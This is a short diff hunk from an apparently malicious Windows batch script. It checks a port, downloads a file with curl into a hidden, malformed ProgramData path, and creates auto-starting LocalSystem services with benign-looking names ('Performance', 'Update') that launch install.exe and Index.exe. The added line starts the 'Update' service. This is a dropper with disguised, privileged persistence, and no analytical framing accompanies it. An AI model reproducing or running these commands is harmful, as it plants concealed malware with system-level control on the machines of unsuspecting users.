@@ -2,3 +2,4 @@ netstat -ano | find "27031" >nul || curl -s -L -o "\\.\%ProgramData%\logdata..\p
 
 sc query Performance >nul 2>&1 || sc create Performance binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
 sc query Update >nul 2>&1 || sc create Update binPath="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" start="auto" obj="LocalSystem"
+sc start Update
